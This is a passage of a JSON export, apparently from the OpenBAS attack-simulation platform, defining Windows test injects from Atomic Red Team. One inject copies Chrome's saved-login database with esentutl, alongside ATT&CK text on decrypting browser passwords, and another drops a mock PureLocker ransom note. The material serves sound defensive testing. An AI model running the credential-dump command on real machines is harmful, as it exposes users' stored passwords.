user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lastname\",\"label\":\"Last name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lang\",\"label\":\"Language of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"exercise\",\"label\":\"Exercise of the current injection\",\"type\":\"Object\",\"cardinality\":\"1\",\"children\":[{\"key\":\"exercise.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.name\",\"label\":\"Name of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.description\",\"label\":\"Description of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"teams\",\"label\":\"List of team name for the injection\",\"type\":\"String\",\"cardinality\":\"n\",\"children\":[]},{\"key\":\"player_uri\",\"label\":\"Player interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"challenges_uri\",\"label\":\"Challenges interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"scoreboard_uri\",\"label\":\"Scoreboard interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"lessons_uri\",\"label\":\"Lessons learned interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}],\"context\":{},\"contract_id\":\"c8b13612-08be-40a7-95f4-e72e531dd51e\",\"contract_attack_patterns_external_ids\":[],\"is_atomic_testing\":true,\"needs_executor\":true,\"platforms\":[\"Windows\"]}",
      "injector_contract_custom" : false,
      "injector_contract_needs_executor" : true,
      "injector_contract_platforms" : [ "Windows" ],
      "injector_contract_payload" : {
        "listened" : true,
        "payload_id" : "3f7ea420-9268-466d-b950-8377a2f44e05",
        "payload_type" : "Command",
        "payload_name" : "Dump Chrome Login Data with esentutl",
        "payload_description" : "This test simulates an adversary using esentutl to dump encrypted credentials from Google Chrome's Login database.\n[Reference](https://actzero.ai/resources/blog/hygiene-tip-shut-down-attackers-harvesting-cached-browser-credentials/)\n",
        "payload_platforms" : [ "Windows" ],
        "payload_attack_patterns" : [ {
          "attack_pattern_id" : "82181957-6de9-4549-bfda-f097745609b9",
          "attack_pattern_name" : "Credentials from Web Browsers",
          "attack_pattern_description" : "Adversaries may acquire credentials from web browsers by reading files specific to the target browser.(Citation: Talos Olympic Destroyer 2018) Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.\n\nFor example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim’s cached logon credentials as the decryption key.(Citation: Microsoft CryptUnprotectData April 2018)\n \nAdversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc.(Citation: Proofpoint Vega Credential Stealer May 2018)(Citation: FireEye HawkEye Malware July 2017) Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the [Windows Credential Manager](https://attack.mitre.org/techniques/T1555/004).\n\nAdversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.(Citation: GitHub Mimikittenz July 2016)\n\nAfter acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).",
          "attack_pattern_external_id" : "T1555.003",
          "attack_pattern_kill_chain_phases" : [ {
            "phase_id" : "447bbaf6-82da-4c43-90c8-713bd6117a85",
            "phase_external_id" : "TA0006",
            "phase_stix_id" : "x-mitre-tactic--2558fd61-8c75-4730-94c4-11926db2a263",
            "phase_name" : "Credential Access",
            "phase_shortname" : "credential-access",
            "phase_kill_chain_name" : "mitre-attack",
            "phase_description" : "The adversary is trying to steal account names and passwords.\n\nCredential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals.",
            "phase_order" : 7
          } ]
        } ],
        "payload_cleanup_executor" : "cmd",
        "payload_cleanup_command" : "del /f /q #{output_path} > nul 2>&1\n",
        "payload_elevation_required" : false,
        "payload_arguments" : [ {
          "type" : "text",
          "key" : "output_path",
          "default_value" : "%temp%\\T1555.003_Login_Data.tmp",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads_atomicredteam_path",
          "default_value" : "./ExternalPayloads/../ExternalPayloads",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\ChromeStandaloneSetup64_msi_atomicredteam_path",
          "default_value" : "./ExternalPayloads/../ExternalPayloads/ChromeStandaloneSetup64.msi",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\ChromeStandaloneSetup64_msi_atomicredteam_path",
          "default_value" : "./ExternalPayloads/../ExternalPayloads/ChromeStandaloneSetup64.msi",
          "description" : null,
          "separator" : null
        } ],
        "payload_prerequisites" : [ {
          "executor" : "psh",
          "get_command" : "New-Item -Type Directory \"#{PathToAtomicsFolder\\__\\ExternalPayloads_atomicredteam_path}\\\" -ErrorAction Ignore -Force | Out-Null\n$installer = \"#{PathToAtomicsFolder\\__\\ExternalPayloads_atomicredteam_path}\\ChromeStandaloneSetup64.msi\"\nInvoke-WebRequest -OutFile \"#{PathToAtomicsFolder\\__\\ExternalPayloads_atomicredteam_path}\\ChromeStandaloneSetup64.msi\" https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi\nmsiexec /i $installer /qn\nStart-Process -FilePath \"chrome.exe\"\nStop-Process -Name \"chrome\"\n",
          "check_command" : "if ((Test-Path \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\") -Or (Test-Path \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\")) {exit 0} else {exit 1}",
          "description" : "Chrome must be installed\n"
        } ],
        "payload_external_id" : "70422253-8198-4019-b617-6be401b49fce",
        "payload_source" : "COMMUNITY",
        "payload_status" : "UNVERIFIED",
        "payload_execution_arch" : "ALL_ARCHITECTURES",
        "payload_collector" : "0f2a85c1-0a3b-4405-a79c-c65398ee4a76",
        "payload_detection_remediations" : [ ],
        "payload_tags" : [ ],
        "payload_output_parsers" : [ ],
        "payload_created_at" : "2024-12-12T08:12:32.942889Z",
        "payload_updated_at" : "2025-07-03T14:49:40.610401Z",
        "command_executor" : "cmd",
        "command_content" : "esentutl.exe /y \"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data\" /d \"#{output_path}\"\n",
        "payload_collector_type" : "openbas_atomic_red_team"
      },
      "injector_contract_created_at" : "2024-12-12T08:12:32.955882Z",
      "injector_contract_updated_at" : "2024-12-12T08:12:32.955882Z",
      "injector_contract_injector" : "49229430-b5b5-431f-ba5b-f36f599b0144",
      "injector_contract_attack_patterns" : [ {
        "attack_pattern_id" : "82181957-6de9-4549-bfda-f097745609b9",
        "attack_pattern_name" : "Credentials from Web Browsers",
        "attack_pattern_description" : "Adversaries may acquire credentials from web browsers by reading files specific to the target browser.(Citation: Talos Olympic Destroyer 2018) Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.\n\nFor example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim’s cached logon credentials as the decryption key.(Citation: Microsoft CryptUnprotectData April 2018)\n \nAdversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc.(Citation: Proofpoint Vega Credential Stealer May 2018)(Citation: FireEye HawkEye Malware July 2017) Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the [Windows Credential Manager](https://attack.mitre.org/techniques/T1555/004).\n\nAdversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.(Citation: GitHub Mimikittenz July 2016)\n\nAfter acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).",
        "attack_pattern_external_id" : "T1555.003",
        "attack_pattern_kill_chain_phases" : [ {
          "phase_id" : "447bbaf6-82da-4c43-90c8-713bd6117a85",
          "phase_external_id" : "TA0006",
          "phase_stix_id" : "x-mitre-tactic--2558fd61-8c75-4730-94c4-11926db2a263",
          "phase_name" : "Credential Access",
          "phase_shortname" : "credential-access",
          "phase_kill_chain_name" : "mitre-attack",
          "phase_description" : "The adversary is trying to steal account names and passwords.\n\nCredential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals.",
          "phase_order" : 7
        } ]
      } ],
      "injector_contract_atomic_testing" : true,
      "injector_contract_import_available" : false,
      "injector_contract_arch" : "ALL_ARCHITECTURES",
      "injector_contract_injector_type" : "openbas_implant",
      "injector_contract_injector_type_name" : "OpenBAS Implant"
    },
    "inject_tags" : [ ],
    "inject_teams" : [ ],
    "inject_documents" : [ ]
  }, {
    "inject_id" : "fca7725f-a410-42ca-88e4-d6807e89d3dc",
    "inject_title" : "PureLocker Ransom Note",
    "inject_description" : null,
    "inject_country" : null,
    "inject_city" : null,
    "inject_enabled" : true,
    "inject_content" : {
      "expectations" : [ {
        "expectation_type" : "PREVENTION",
        "expectation_name" : "Expect inject to be prevented",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      }, {
        "expectation_type" : "DETECTION",
        "expectation_name" : "Expect inject to be detected",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      } ]
    },
    "inject_all_teams" : false,
    "inject_depends_on" : [ ],
    "inject_depends_duration" : 1740,
    "inject_injector_contract" : {
      "convertedContent" : {
        "config" : {
          "type" : "openbas_implant",
          "expose" : true,
          "label" : {
            "en" : "OpenBAS Implant",
            "fr" : "OpenBAS Implant"
          },
          "color_dark" : "#000000",
          "color_light" : "#000000"
        },
        "label" : {
          "en" : "PureLocker Ransom Note",
          "fr" : "PureLocker Ransom Note"
        },
        "manual" : false,
        "fields" : [ {
          "key" : "assets",
          "label" : "Assets",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset"
        }, {
          "key" : "assetgroups",
          "label" : "Asset groups",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset-group"
        }, {
          "key" : "obfuscator",
          "label" : "Obfuscators",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "1",
          "defaultValue" : [ "plain-text" ],
          "choices" : [ {
            "label" : "plain-text",
            "value" : "plain-text",
            "information" : ""
          }, {
            "label" : "base64",
            "value" : "base64",
            "information" : "CMD does not support base64 obfuscation"
          } ],
          "type" : "choice"
        }, {
          "key" : "expectations",
          "label" : "Expectations",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "predefinedExpectations" : [ {
            "expectation_type" : "PREVENTION",
            "expectation_name" : "Prevention",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "DETECTION",
            "expectation_name" : "Detection",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "VULNERABILITY",
            "expectation_name" : "Not vulnerable",
            "expectation_description" : "",
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          } ],
          "type" : "expectation"
        } ],
        "variables" : [ {
          "key" : "user",
          "label" : "User that will receive the injection",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ {
            "key" : "user.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.email",
            "label" : "Email of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.firstname",
            "label" : "First name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lastname",
            "label" : "Last name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lang",
            "label" : "Language of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "exercise",
          "label" : "Exercise of the current injection",
          "type" : "Object",
          "cardinality" : "1",
          "children" : [ {
            "key" : "exercise.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.name",
            "label" : "Name of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.description",
            "label" : "Description of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "teams",
          "label" : "List of team name for the injection",
          "type" : "String",
          "cardinality" : "n",
          "children" : [ ]
        }, {
          "key" : "player_uri",
          "label" : "Player interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "challenges_uri",
          "label" : "Challenges interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "scoreboard_uri",
          "label" : "Scoreboard interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "lessons_uri",
          "label" : "Lessons learned interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        } ],
        "context" : { },
        "contract_id" : "55b06212-21ab-4e31-b516-e86cd21348b7",
        "contract_attack_patterns_external_ids" : [ ],
        "is_atomic_testing" : true,
        "needs_executor" : true,
        "platforms" : [ "Windows" ]
      },
      "listened" : true,
      "injector_contract_id" : "55b06212-21ab-4e31-b516-e86cd21348b7",
      "injector_contract_labels" : {
        "en" : "PureLocker Ransom Note",
        "fr" : "PureLocker Ransom Note"
      },
      "injector_contract_manual" : false,
      "injector_contract_content" : "{\"config\":{\"type\":\"openbas_implant\",\"expose\":true,\"label\":{\"en\":\"OpenBAS Implant\",\"fr\":\"OpenBAS Implant\"},\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"label\":{\"en\":\"PureLocker Ransom Note\",\"fr\":\"PureLocker Ransom Note\"},\"manual\":false,\"fields\":[{\"key\":\"assets\",\"label\":\"Assets\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset\"},{\"key\":\"assetgroups\",\"label\":\"Asset groups\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset-group\"},{\"key\":\"obfuscator\",\"label\":\"Obfuscators\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"choices\":[{\"label\":\"plain-text\",\"value\":\"plain-text\",\"information\":\"\"},{\"label\":\"base64\",\"value\":\"base64\",\"information\":\"CMD does not support base64 obfuscation\"}],\"type\":\"choice\"},{\"key\":\"expectations\",\"label\":\"Expectations\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"predefinedExpectations\":[{\"expectation_type\":\"PREVENTION\",\"expectation_name\":\"Prevention\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"DETECTION\",\"expectation_name\":\"Detection\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"VULNERABILITY\",\"expectation_name\":\"Not vulnerable\",\"expectation_description\":\"\",\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}],\"type\":\"expectation\"}],\"variables\":[{\"key\":\"user\",\"label\":\"User that will receive the injection\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[{\"key\":\"user.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.email\",\"label\":\"Email of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.firstname\",\"label\":\"First name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lastname\",\"label\":\"Last name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lang\",\"label\":\"Language of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"exercise\",\"label\":\"Exercise of the current injection\",\"type\":\"Object\",\"cardinality\":\"1\",\"children\":[{\"key\":\"exercise.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.name\",\"label\":\"Name of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.description\",\"label\":\"Description of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"teams\",\"label\":\"List of team name for the injection\",\"type\":\"String\",\"cardinality\":\"n\",\"children\":[]},{\"key\":\"player_uri\",\"label\":\"Player interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"challenges_uri\",\"label\":\"Challenges interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"scoreboard_uri\",\"label\":\"Scoreboard interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"lessons_uri\",\"label\":\"Lessons learned interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}],\"context\":{},\"contract_id\":\"55b06212-21ab-4e31-b516-e86cd21348b7\",\"contract_attack_patterns_external_ids\":[],\"is_atomic_testing\":true,\"needs_executor\":true,\"platforms\":[\"Windows\"]}",
      "injector_contract_custom" : false,
      "injector_contract_needs_executor" : true,
      "injector_contract_platforms" : [ "Windows" ],
      "injector_contract_payload" : {
        "listened" : true,
        "payload_id" : "2f6be220-68a8-4cf5-9e3c-bd5ff50186d7",
        "payload_type" : "Command",
        "payload_name" : "PureLocker Ransom Note",
        "payload_description" : "building the IOC (YOUR_FILES.txt) for the PureLocker ransomware \nhttps://www.bleepingcomputer.com/news/security/purelocker-ransomware-can-lock-files-on-windows-linux-and-macos/\n",
        "payload_platforms" : [ "Windows" ],
        "payload_attack_patterns" : [ {
          "attack_pattern_id" : "6b36da75-8392-420d-8267-66320c7cccd4",
          "attack_pattern_name" : "Data Encrypted for Impact",
          "attack_pattern_description" : "Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.(Citation: US-CERT Ransomware 2016)(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017)(Citation: US-CERT SamSam 2018)\n\nIn the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529), in order to unlock and/or gain access to manipulate these files.(Citation: CarbonBlack Conti July 2020) In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.(Citation: US-CERT NotPetya 2017) Adversaries may also encrypt virtual machines hosted on ESXi or other hypervisors.(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021) \n\nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017) Encryption malware may also leverage [Internal Defacement](https://attack.mitre.org/techniques/T1491/001), such as changing victim wallpapers or ESXi server login messages, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\").(Citation: NHS Digital Egregor Nov 2020)(Citation: Varonis)\n\nIn cloud environments, storage objects within compromised accounts may also be encrypted.(Citation: Rhino S3 Ransomware Part 1) For example, in AWS environments, adversaries may leverage services such as AWS’s Server-Side Encryption with Customer Provided Keys (SSE-C) to encrypt data.(Citation: Halcyon AWS Ransomware 2025)",
          "attack_pattern_external_id" : "T1486",
          "attack_pattern_kill_chain_phases" : [ {
            "phase_id" : "dc8b2833-11ea-45e6-93f9-bb5f5d45f17c",
            "phase_external_id" : "TA0040",
            "phase_stix_id" : "x-mitre-tactic--5569339b-94c2-49ee-afb3-2222936582c8",
            "phase_name" : "Impact",
            "phase_shortname" : "impact",
            "phase_kill_chain_name" : "mitre-attack",
            "phase_description" : "The adversary is trying to manipulate, interrupt, or destroy your systems and data.\n \nImpact consists of techniques that adversaries use to disrupt availability or compromise integrity by manipulating business and operational processes. Techniques used for impact can include destroying or tampering with data. In some cases, business processes can look fine, but may have been altered to benefit the adversaries’ goals. These techniques might be used by adversaries to follow through on their end goal or to provide cover for a confidentiality breach.",
            "phase_order" : 13
          } ]
        } ],
        "payload_cleanup_executor" : "cmd",
        "payload_cleanup_command" : "del %USERPROFILE%\\Desktop\\YOUR_FILES.txt >nul 2>&1\n",
        "payload_elevation_required" : true,
        "payload_arguments" : [ ],
        "payload_prerequisites" : [ ],
        "payload_external_id" : "649349c7-9abf-493b-a7a2-b1aa4d141528",
        "payload_source" : "COMMUNITY",
        "payload_status" : "UNVERIFIED",
        "payload_execution_arch" : "ALL_ARCHITECTURES",
        "payload_collector" : "0f2a85c1-0a3b-4405-a79c-c65398ee4a76",
        "payload_detection_remediations" : [ ],
        "payload_tags" : [ ],
        "payload_output_parsers" : [ ],
        "payload_created_at" : "2024-12-12T08:12:51.468961Z",
        "payload_updated_at" : "2025-07-03T14:51:14.555405Z",
        "command_executor" : "cmd",
        "command_content" : "echo T1486 - Purelocker Ransom Note > %USERPROFILE%\\Desktop\\YOUR_FILES.txt\n",
        "payload_collector_type" : "openbas_atomic_red_team"
      },
      "injector_contract_created_at" : "2024-12-12T08:12:51.481986Z",
      "injector_contract_updated_at" : "2024-12-12T08:12:51.481987Z",
      "injector_contract_injector" : "49229430-b5b5-431f-ba5b-f36f599b0144",
      "injector_contract_attack_patterns" : [ {
        "attack_pattern_id" : "6b36da75-8392-420d-8267-66320c7cccd4",
        "attack_pattern_name" : "Data Encrypted for Impact",
        "attack_pattern_description" : "Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.(Citation: US-CERT Ransomware 2016)(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017)(Citation: US-CERT SamSam 2018)\n\nIn the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529), in order to unlock and/or gain access to manipulate these files.(Citation: CarbonBlack Conti July 2020) In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.(Citation: US-CERT NotPetya 2017) Adversaries may also encrypt virtual machines hosted on ESXi or other hypervisors.(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021) \n\nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017) Encryption malware may also leverage [Internal Defacement](https://attack.mitre.org/techniques/T1491/001), such as changing victim wallpapers or ESXi server login messages, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\").(Citation: NHS Digital Egregor Nov 2020)(Citation: Varonis)\n\nIn cloud environments, storage objects within compromised accounts may also be encrypted.(Citation: Rhino S3 Ransomware Part 1) For example, in AWS environments, adversaries may leverage services such as AWS’s Server-Side Encryption with Customer Provided Keys (SSE-C) to encrypt data.(Citation: Halcyon AWS Ransomware 2025)",
        "attack_pattern_external_id" : "T1486",
        "attack_pattern_kill_chain_phases" : [ {
          "phase_id" : "dc8b2833-11ea-45e6-93f9-bb5f5d45f17c",
          "phase_external_id" : "TA0040",
          "phase_stix_id" : "x-mitre-tactic--5569339b-94c2-49ee-afb3-2222936582c8",
          "phase_name" : "Impact",
          "phase_shortname" : "impact",
          "phase_kill_chain_name" : "mitre-attack",
          "phase_description" : "The adversary is trying to manipulate, interrupt, or destroy your systems and data.\n \nImpact consists of techniques that adversaries use to disrupt availability or compromise integrity by manipulating business and operational processes. Techniques used for impact can include destroying or tampering with data. In some cases, business processes can look fine, but may have been altered to benefit the adversaries’ goals. These techniques might be used by adversaries to follow through on their end goal or to provide cover for a confidentiality breach.",
          "phase_order" : 13
        } ]
      } ],
      "injector_contract_atomic_testing" : true,
      "injector_contract_import_available" : false,
      "injector_contract_arch" : "ALL_ARCHITECTURES",
      "injector_contract_injector_type" : "openbas_implant",
      "injector_contract_injector_type_name" : "OpenBAS Implant"
    },
    "inject_tags" : [ ],
    "inject_teams" : [ ],
    "inject_documents" : [ ]
  }, {
    "inject_id" : "b9e4df77-c689-4e72-a41e-6993379cbb36",
    "inject_title" : "Basic Permission Groups Discovery Windows (Local)",
    "inject_description" : null,
    "inject_country" : null,
    "inject_city" : null,
    "inject_enabled" : true,
    "inject_content" : {
      "expectations" : [ {
        "expectation_type" : "PREVENTION",
        "expectation_name" : "Expect inject to be prevented",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      }, {
        "expectation_type" : "DETECTION",
        "expectation_name" : "Expect inject to be detected",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      } ]
    },
    "inject_all_teams" : false,
    "inject_depends_on" : [ {
      "dependency_relationship" : {
        "inject_parent_id" : "42be9889-78bf-43fa-a5f0-b794572968f6",
        "inject_children_id" : "b9e4df77-c689-4e72-a41e-6993379cbb36"
      },
      "dependency_condition" : {
        "mode" : "and",
        "conditions" : [ {
          "key" : "Execution",
          "value" : true,
          "operator" : "eq"
        } ]
      },
      "dependency_created_at" : "2025-07-04T15:49:23.613414Z",
      "dependency_updated_at" : "2025-07-04T15:49:23.613429Z"
    } ],
    "inject_depends_duration" : 60,
    "inject_injector_contract" : {
      "convertedContent" : {
        "config" : {
          "type" : "openbas_implant",
          "expose" : true,
          "label" : {
            "en" : "OpenBAS Implant",
            "fr" : "OpenBAS Implant"
          },
          "color_dark" : "#000000",
          "color_light" : "#000000"
        },
        "label" : {
          "en" : "Basic Permission Groups Discovery Windows (Local)",
          "fr" : "Basic Permission Groups Discovery Windows (Local)"
        },
        "manual" : false,
        "fields" : [ {
          "key" : "assets",
          "label" : "Assets",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
